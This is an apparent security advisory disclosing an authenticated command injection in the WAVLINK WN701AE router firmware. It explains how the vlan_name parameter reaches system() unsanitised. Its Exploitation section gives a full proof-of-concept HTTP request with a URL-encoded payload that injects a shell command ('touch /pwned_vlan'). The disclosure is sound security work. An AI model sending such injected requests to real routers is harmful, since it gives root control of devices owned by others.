# WAVLINK WN701AE Router

-  Vendor: WAVLINK
-  Product: WL-WN701AE
-  Firmware Version: M01AE_V260105
-  Vulnerability Type:Authenticated Command Injection

# Description

WAVLINK WN701AE firmware (version WAVLINK-WN701AE-WO-M01AE_V260105-FM-BY.bin) contains a command injection vulnerability in the ioos web backend. The del_vlan_group function does not sanitize the vlan_name parameter before concatenating it into a system() call for command execution. An authenticated attacker can inject arbitrary system commands to achieve remote code execution with root privileges.

## Impact

An attacker can exploit the command injection vulnerability in del_vlan_group to execute arbitrary commands with root privileges on the device, thereby gaining full control over the router. This can lead to: interception and tampering of network traffic, modification of firmware configurations to establish persistent backdoors, lateral movement within the internal network, or the incorporation of large numbers of compromised devices into a botnet for launching large-scale attacks.

## Vulnerability Details

In the del_vlan_group function sub_4113D4, after authentication checks, the user-controllable parameter vlan_name is passed to strcpy(v8, v4);, then enters a for loop: i = (const char *)strtok_r(v8, ";", v10); — the input string is split by semicolons (;) and each token is assigned to i. Subsequently, snprintf(v9, 256, "vlan_group.sh del \"%s\"", i); formats the command string, which is then executed via system(v9), resulting in command injection.





<img width="1209" height="221" alt="图片" src="https://github.com/user-attachments/assets/10c1806d-5e4f-42f0-a806-a5a5b235eec2" />




<img width="1559" height="1348" alt="图片" src="https://github.com/user-attachments/assets/ac465c8b-92ad-4f5e-bf4b-fb83570152d8" />


<img width="1157" height="674" alt="图片" src="https://github.com/user-attachments/assets/42d000ac-5f74-4f9a-99e9-6a8421c34378" />


# Exploitation

**exp**

Authentication is required to obtain a valid token before exploiting this vulnerability.

```http
GET /protocol.csp?fname=net&opt=del_vlan_group&function=set&vlan_name=aa%22%20%7C%20touch%20%2Fpwned_vlan%20%23&token=6053DFA50DD9985A95F0714AF96DE8E4 HTTP/1.1

Host: 192.168.10.3

Accept: application/json, text/javascript, */*; q=0.01

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

X-Requested-With: XMLHttpRequest

Referer: http://192.168.10.3/html/index.html?v=1786177330489

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close
```


<img width="1628" height="480" alt="图片" src="https://github.com/user-attachments/assets/70f34924-464b-40dc-9e2a-1b286824cbfc" />


